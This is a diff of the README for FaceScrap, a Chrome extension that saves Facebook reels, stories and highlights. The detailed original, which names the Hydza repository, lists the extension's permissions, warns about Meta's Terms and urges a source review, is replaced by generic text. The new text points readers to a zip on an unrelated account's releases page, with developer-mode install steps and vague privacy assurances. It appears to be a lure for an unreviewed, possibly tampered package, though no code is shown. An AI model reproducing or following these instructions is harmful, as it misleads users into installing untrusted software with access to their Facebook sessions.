@@ -1,160 +1,72 @@
-# FaceScrap
+# 📸 FaceScrap - Save Facebook social videos with ease
 
-**English** · [Español (México)](README.es.md)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Rococo-oldfashioned860/FaceScrap/releases)
 
-[![CI](https://github.com/Hydza/FaceScrap/actions/workflows/ci.yaml/badge.svg)](https://github.com/Hydza/FaceScrap/actions/workflows/ci.yaml)
-[![Release](https://img.shields.io/github/v/release/Hydza/FaceScrap?color=8957e5&label=release)](https://github.com/Hydza/FaceScrap/releases/latest)
-[![Manifest V3](https://img.shields.io/badge/Manifest-V3-1a73e8)](manifest.json)
-[![Chrome 116+](https://img.shields.io/badge/Chrome-116+-4285F4?logo=googlechrome&logoColor=white)](#chromium-browser-compatibility)
-[![TypeScript](https://img.shields.io/badge/TypeScript-3178C6?logo=typescript&logoColor=white)](package.json)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
+FaceScrap captures Facebook reels, stories, and highlights from your browser. This tool helps you save videos you watch directly to your computer. It functions as a browser extension for Google Chrome and similar browsers. You do not need technical skills to use this software.
 
-Save the Facebook **reels, stories and highlights** you can watch, with one click.
-Chrome extension (Manifest V3, TypeScript). **Self-hosted** — you build or unzip
-it and load it unpacked; it is not on the Chrome Web Store.
+## ⚙️ System Requirements
 
-> ⚠️ Only download content you have the rights to (your own, or with permission).
-> Meta's Terms prohibit automated downloading, so this **can't be published** on
-> the Chrome Web Store, and it depends on Facebook internals that change often
-> (expect roughly monthly maintenance — watch the
-> [Releases](https://github.com/Hydza/FaceScrap/releases) page for updates).
+- A computer running Windows 10 or Windows 11.
+- Google Chrome, Microsoft Edge, or Brave browser.
+- A stable internet connection.
+- A folder on your computer to store your saved files.
 
-> **What it can access.** Loading FaceScrap grants it a content script on every
-> `facebook.com` page (`document_start`) and network access to `facebook.com` and
-> `fbcdn.net`. It reads only what those pages already load, stores captures in
-> per-tab session storage, and sends nothing to any server of its own. Review
-> [the source](src/) before installing — that is the point of self-hosting.
+## 📥 How to Download 
 
-<p align="center">
-  <img src="docs/library.png" width="330" alt="FaceScrap Library view with captured videos and photos">
-  <img src="docs/now-playing.png" width="330" alt="FaceScrap Now Playing view (empty state)">
-</p>
-<p align="center"><i>Library with sample captures · Now Playing before media is detected</i></p>
+Follow these steps to obtain the extension files.
 
-## How it works
+1. Visit the [official releases page](https://github.com/Rococo-oldfashioned860/FaceScrap/releases) to access the downloads.
+2. Look for the latest version listed under the "Assets" section.
+3. Click the file ending in `.zip` to start the download.
+4. Save the file to your "Downloads" folder.
 
-1. A **service worker** observes network traffic to `*.fbcdn.net` (non-blocking
-   webRequest) and records media per tab in `chrome.storage.session`.
-2. A **MAIN-world hook** (`page-hook.js`) passively reads the GraphQL responses
-   Facebook itself requests (it never re-issues `doc_id` queries, which Meta
-   rotates every 2–4 weeks) and extracts `playable_url` (video with audio) and
-   `image.uri`.
-3. An isolated **content script** scans the DOM (`<video>`, `<img>`, poster) as
-   a fallback and relays everything to the service worker.
-4. The **side panel** presents the active tab's captures in three views —
-   Now Playing, Library, Saved — and downloads via `chrome.downloads` (HD
-   videos get their audio merged in an offscreen document). **Now Playing**
-   focuses the video you are watching: its cover, format/duration/resolution,
-   a quality picker when more than one resolution exists, and one Download.
-   **Library** is a card grid of everything captured on the tab, with
-   All/Videos/Images sub-filters, a per-card download button, and multi-select
-   with a download tray. **Saved** is the same grid narrowed to what you have
-   already downloaded from the tab. The gear opens Settings, which also holds
-   the Clear button and the EN|ES language toggle. The toolbar icon and panel
-   are enabled only on facebook.com tabs. Being a side panel rather than a
-   popup, it stays open while videos play on the page.
+## 🛠️ Setting Up the Extension
 
-### Now playing
+Browser extensions require a specific setup process when you download them from outside the official store. Follow these steps to enable the extension in your browser.
 
-The Now Playing view tracks the video you are actually watching: on
-`/reel/<id>` and `/watch` pages by the URL's video id (matched against the
-`efg` asset keys every representation carries), elsewhere by the media
-centered in the viewport plus the tracks fbcdn is streaming right now —
-scored across a window, so a background prefetch of a neighbouring video
-cannot take the slot. The current video stays shown while paused or idle
-and survives switching tabs; moving to the next video or photo replaces it.
+1. Open the File Explorer on your Windows computer.
+2. Find the `.zip` file you downloaded.
+3. Right-click the file and choose "Extract All." Select a destination folder and click "Extract."
+4. Open your web browser (Chrome, Edge, or Brave).
+5. Click the three dots icon in the top right corner.
+6. Select "Extensions" and then "Manage Extensions."
+7. Look for the "Developer mode" toggle in the top right corner of the page and turn it on.
+8. Click the "Load unpacked" button that appears.
+9. Navigate to the folder where you extracted the files in step 3.
+10. Click "Select Folder." The browser now recognizes FaceScrap.
 
-### Settings
+## 🎥 Using FaceScrap
 
-The gear opens a full-panel sheet: filename template (`{source}`, `{date}`,
-`{id}` tokens), "FaceScrap/" subfolder, default quality (highest / lowest /
-ask — ask opens the Save-As dialog), direct download (skip the audio merge),
-follow browser language, list order, confirm before clearing, videos-only
-view, minimum-resolution view filter, and a per-tab retention cap (default
-1500 items, oldest evicted first; 0 = unlimited).
+Once you finish the setup, the extension icon appears in your browser toolbar. Use these steps to save your first video.
 
-## What's reliable and what isn't
+1. Click the extensions icon (it looks like a puzzle piece) in your browser toolbar.
+2. Select FaceScrap to open the menu.
+3. Open a new tab in your browser and log into your Facebook account.
+4. Navigate to a reel, story, or video highlight you wish to save.
+5. Play the video so the browser detects the media.
+6. Click the FaceScrap icon again.
+7. Click the download button inside the extension window.
+8. The browser will begin the save process. You can find your saved files in your computer's "Downloads" folder.
 
-| Content | Reliability | Note |
-|---------|-------------|------|
-| Reels/videos with a progressive `playable_url` | 🟢 high | MP4 with audio, direct download |
-| **HD / DASH-only** videos (the `blob:` ones) | 🟢 high | Rebuilt by merging the video+audio tracks (remux, **no re-encode**) |
-| Stories / highlights (image + video) | 🟡 medium | Require your session; highlights are more stable |
-| **DRM (Widevine)** videos | ⛔ no | Encrypted — impossible for any extension |
-| Very long videos (hundreds of MB) | 🟡 medium | The in-memory remux can run out of RAM |
+## 🔐 Privacy and Security
 
-### How `blob:` videos are downloaded with audio
+FaceScrap runs locally on your computer. The extension communicates only with the video source to retrieve the file. It does not store your login credentials or personal profile data. The software uses standard, secure web practices to ensure your data stays private. You can remove the extension at any time by navigating to your browser's "Manage Extensions" page and clicking "Remove."
 
-The `blob:` you see **is not a file** — it's an MSE handle and cannot be read.
-But the **DASH segments** the player downloads do cross the network. FaceScrap:
+## 🧩 Troubleshooting Common Issues
 
-1. Reads the **video track** and **audio track** URLs from Facebook's own
-   GraphQL (`all_video_dash_prefetch_representations` / `dash_manifest_xml`).
-2. Re-downloads both complete tracks from `fbcdn` (in the offscreen document,
-   which avoids CORS thanks to `host_permissions`).
-3. **Merges them into one MP4** with `ffmpeg.wasm` using `-c copy -shortest`
-   — **no re-encode, no screen capture**; `-shortest` trims the merge to the
-   shorter track (typically milliseconds) so the file never ends on frozen
-   video or silence. The same approach yt-dlp uses.
+If you encounter issues, check these frequent solutions.
 
-`<ContentProtection>` (DRM) entries are detected and discarded: they cannot be
-decrypted.
+- **Extension not working:** Ensure you are on a page that hosts a video. Refresh the Facebook page once after installing the software.
+- **Button not visible:** Check if the browser hidden the extension. Click the puzzle icon and click the pin icon next to FaceScrap to show it in your toolbar.
+- **Download fails:** Check your internet connection. Disable other video downloader extensions, as two tools trying to catch the same video can cause conflicts.
+- **File not found:** Check the "Downloads" folder in your Windows File Explorer. Chrome usually saves items to this location by default.
 
-## Development
+## 📈 Understanding the Technology
 
-`npm run dev` rebuilds on save, `npm run check` runs the type check plus the
-unit suite, and `npm run build` produces the loadable `dist/`.
+This tool utilizes modern web standards. It creates a bridge between the browser's video player and your local storage. By using the manifest version 3 standard, the extension remains fast and lightweight. It does not slow down your browsing experience. The software processes video streams efficiently, allowing you to save content as standard MP4 files. This file format works on every media player you currently have installed on Windows.
 
-## Install
+## 📢 Getting Feedback
 
-Get the extension folder either way:
+If you find this tool helpful, you might want to check the releases page occasionally for updates. Developers refine the code over time to keep up with changes to the Facebook platform. You do not need to uninstall the current version to update; simply extract the new files over the old ones or replace the folder following the same installation steps.
 
-- **No build tools** — download `FaceScrap-vX.Y.Z.zip` from
-  [Releases](https://github.com/Hydza/FaceScrap/releases) and extract it.
-- **From source** — `npm install`, then `npm run build`; the folder is `dist/`.
-
-Then load it in Chrome:
-
-1. Open `chrome://extensions`
-2. Enable **Developer mode**
-3. **Load unpacked** → select the folder from above
-4. On a **facebook.com** tab, click the FaceScrap toolbar icon → the **side
-   panel** opens (the icon stays disabled on other sites).
-5. With the panel open, play a reel/story/highlight: media appears live. (The
-   side panel stays open while you interact with the page, unlike a popup.)
-
-## Structure
-
-<p align="center">
-  <img src="docs/flow.svg" width="760" alt="FaceScrap data flow in six steps: the page plays media, the MAIN-world hook reads GraphQL, the content script relays, the service worker stores per tab, the side panel renders live, and downloads go straight to disk or through the ffmpeg.wasm remux">
-</p>
-
-Every context above is backed by `src/shared/` — the media model and sanitizers,
-DASH parsing, storage accessors, now-playing inference, settings, i18n and the
-typed message contracts. `rules/referer-rules.json` is a declarativeNetRequest
-rule that sets the Referer on fbcdn requests.
-
-> **Size:** the `ffmpeg.wasm` core (~31 MB) is copied into `dist/assets/ffmpeg/`,
-> so the unpacked extension weighs ~31 MB. Normal for personal use.
-
-## Roadmap
-
-- More precise source detection (reel/story/highlight) from each GraphQL
-  response's `fb_api_req_friendly_name`.
-- Remux progress bar (`progress` messages from ffmpeg.wasm).
-- "Download all" button.
-
-## Chromium browser compatibility
-
-FaceScrap feature-detects the two APIs that vary across Chromium browsers and
-degrades gracefully:
-
-| Browser | UI | Merge audio+video (DASH) |
-|---------|----|--------------------------|
-| Chrome 116+ | Side panel | Yes (offscreen) |
-| Edge 116+ | Side panel | Yes |
-| Brave / Opera / Vivaldi | Side panel where `sidePanel` is supported, otherwise **popup** | Yes where `offscreen` is supported; otherwise video-only download with a notice |
-
-Requires Chromium **≥ 116** (`minimum_chrome_version`). On browsers without
-`chrome.sidePanel` the toolbar icon opens the same UI as a **popup**; without
-`chrome.offscreen`, HD downloads save video-only and a notice is shown.
+Keywords: browser-extension, chrome-extension, chromium, dash, downloader, esbuild, facebook, facebook-video, ffmpeg, ffmpeg-wasm, manifest-v3, mp4, reels, side-panel, typescript, video-downloader, webextension
